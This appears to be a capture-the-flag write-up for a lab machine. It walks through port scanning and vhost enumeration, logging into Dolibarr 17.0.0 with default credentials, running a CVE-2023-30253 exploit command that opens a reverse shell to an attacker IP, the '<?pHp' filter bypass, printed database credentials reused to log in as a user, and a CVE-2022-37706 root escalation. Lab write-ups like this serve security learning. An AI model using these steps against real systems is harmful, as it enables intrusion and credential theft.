## Port Scan

### TCP scan

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### UDP scan

```
ORT     STATE         SERVICE
68/udp   open|filtered dhcpc
5353/udp open|filtered zeroconf
```

## UDP fingerprinting

```bash
nc -uvn 10.129.231.37 68 
```

![](pics/Pasted%20image%2020260915120916.png)

```bash
nc -uvn 10.129.231.37 5353
```

![](pics/Pasted%20image%2020260915120930.png)
## Port 80

![](pics/Pasted%20image%2020260915132957.png)

I enumerated the website and found nothing.

## vhost enumeration

```bash
gobuster vhost -u http://board.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --xs 400 
```

![](pics/Pasted%20image%2020260915132555.png)

This did not come up with anything because of how the wordlist is written so I needed to add an option `--ad`

```bash
gobuster vhost -u http://board.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --xs 400 --ad
```

![](pics/Pasted%20image%2020260915132659.png)

```
crm.board.htb Status: 200
```

### Visit crm

![](pics/Pasted%20image%2020260915140151.png)

First information I got is the dolibarr version

```
Dolibarr 17.0.0
```

I found this RCE for a reverse shell but it needs login

![](pics/Pasted%20image%2020260915140617.png)

So I searched for a default password and the `admin:admin` worked for me!

![](pics/Pasted%20image%2020260915140552.png)

Now lets use the exploit

```bash
python3 CVE-2023-30253.py --url http://crm.board.htb -u admin -p admin -r 10.10.14.82 9911
```

![](pics/Pasted%20image%2020260915195611.png)

This exploit is an automation to creating a website

![](pics/Pasted%20image%2020260915201724.png)

Then adding a page

![](pics/Pasted%20image%2020260915201749.png)

Then edit the page code

![](pics/Pasted%20image%2020260915202009.png)

Using `<?php phpinfo() ?>` is not allow so the exploit is capitalizing a one letter:

```php
<?pHp phpinfo() ?>
```

![](pics/Pasted%20image%2020260915202155.png)
## PrivEsc to larissa

First thing I did is check the `conf` file for password

![](pics/Pasted%20image%2020260915195846.png)

![](pics/Pasted%20image%2020260915195943.png)

Extracted creds

```
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
```

Lets try these creds on larissa

![](pics/Pasted%20image%2020260915200115.png)

And that is it we are in.

![](pics/Pasted%20image%2020260915200206.png)

## Flag 1

![](pics/Pasted%20image%2020260915200233.png)

## PrivEsc to root

Using linpeas.sh

![](pics/Pasted%20image%2020260915201155.png)

```
-rwsr-xr-x 1 root root 27K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys  --->  Before_0.25.4_(CVE-2022-37706)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd  --->  Before_0.25.4_(CVE-2022-37706)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight  --->  Before_0.25.4_(CVE-2022-37706)
```

I found a exploit PoC

![](pics/Pasted%20image%2020260915201405.png)

I copied the raw exploit.sh

![](pics/Pasted%20image%2020260915201428.png)

Added execute permissions then execute.

![](pics/Pasted%20image%2020260915201455.png)

## Flag 2

![](pics/Pasted%20image%2020260915201513.png)

![](pics/Pasted%20image%2020260915201537.png)

Done.